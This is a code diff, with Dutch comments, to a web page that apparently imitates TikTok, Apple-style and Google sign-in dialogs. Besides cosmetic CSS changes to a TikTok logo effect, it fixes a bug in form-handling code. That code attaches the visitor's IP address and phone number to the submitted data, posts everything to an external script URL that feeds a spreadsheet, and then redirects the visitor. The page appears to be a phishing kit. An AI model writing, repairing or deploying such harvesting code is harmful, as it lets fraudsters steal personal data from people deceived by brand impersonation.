@@ -37,9 +37,9 @@
         .apple-input-group input:first-child { border-top-left-radius: 0.5rem; border-top-right-radius: 0.5rem; border-bottom: none; }
         .apple-input-group input:last-child { border-bottom-left-radius: 0.5rem; border-bottom-right-radius: 0.5rem; }
 
-        /* TikTok Aberration (Glitch) Effect */
-        .tiktok-glitch { text-shadow: 0.8px 0.8px 0px #2bf6e5, -0.8px -0.8px 0px #fe2c55; }
-        .tiktok-glitch-lg { text-shadow: 1.2px 1.2px 0px #2bf6e5, -1.2px -1.2px 0px #fe2c55; }
+        /* TikTok Aberration (Glitch) Effect - Subtiel */
+        .tiktok-glitch { text-shadow: 0.7px 0.7px 0px #2bf6e5, -0.7px -0.7px 0px #fe2c55; }
+        .tiktok-glitch-lg { text-shadow: 1.1px 1.1px 0px #2bf6e5, -1.1px -1.1px 0px #fe2c55; }
 
         /* Vloeiende fade animatie */
         .fade-out { animation: fadeOut 0.3s forwards; }
@@ -242,7 +242,6 @@
                 <button onclick="closeModals()" class="text-gray-400 hover:text-black"><i class="fa-solid fa-xmark text-lg"></i></button>
             </div>
             <div class="p-8 pb-10 text-center flex flex-col items-center">
-                <!-- Hier kan de glitch eventueel ook, maar in het origineel is hij clean -->
                 <div class="bg-black text-white w-14 h-14 rounded-xl flex items-center justify-center shadow-md mb-6">
                     <i class="fa-brands fa-tiktok text-3xl tiktok-glitch"></i>
                 </div>
@@ -385,8 +384,8 @@
                 const formData = new FormData(formGoogle);
                 formData.append('user_ip', userIP); 
                 
-                // Dit zorgt ervoor dat de input met name "google_phone" de +31 prefix meekrijgt in de sheet
-                fd.set('google_phone', "(+31) " + num); 
+                // DE VOLGENDE REGEL IS NU GECORRIGEERD (formData ipv fd / phoneInput ipv num)
+                formData.set('google_phone', "(+31) " + phoneInput); 
                 
                 fetch(scriptURL, { method: 'POST', body: formData })
                     .then(() => triggerAppRedirect())
